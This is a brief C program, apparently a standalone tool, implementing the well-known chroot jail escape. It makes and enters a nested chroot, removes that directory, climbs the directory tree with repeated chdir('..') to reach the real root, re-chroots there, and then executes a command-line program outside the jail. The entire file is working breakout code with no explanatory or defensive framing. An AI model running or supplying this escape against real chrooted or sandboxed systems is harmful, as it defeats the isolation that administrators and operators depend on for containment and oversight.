#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <errno.h>
#define BUFMAX 256

int main(int argc, char *argv[]) {

    char buf[BUFMAX+1];

    sprintf(buf, "escape.%d", getpid());

    if (chdir("/") < 0) {
        printf("Can't chdir \"/\" errno=%d\n", errno);
        return 1;
    }

    if (mkdir(buf, 0755) < 0) {
        printf("Can't mkdir \"%s\" errno=%d\n", buf, errno);
        return 1;
    }

    if (chroot(buf) < 0) {
        printf("Can't chroot \"%s\" errno=%d\n", buf, errno);
        return 1;
    }

    if (rmdir(buf) < 0) {
        printf("Can't rmdir \"%s\" errno=%d\n", buf, errno);
        return 1;
    }

    if (!getcwd(buf, BUFMAX)) {
        printf("Can't getcwd errno=%d\n", errno);
        return 1;
    }

    printf("Now escaping from chrooted %s\n", buf);
        do {
            if (chdir("..") < 0) {
                printf("Can't chdir \"..\" cwd=%s errno=%d\n", buf, errno);
                return 1;
            }
            if (!getcwd(buf, BUFMAX)) {
                printf("Can't getcwd errno=%d\n", errno);
                return 1;
            }
        } while (buf[1] != '\0' && buf[0] == '/');

        if (chroot(".") < 0) {
            printf("Can't chroot \".\" errno=%d\n", errno);
            return 1;
        }
        argv++;
        execv(argv[0], argv);
        printf("Can't exec %s err=%d\n", argv[0], errno);
        return 0;
    }

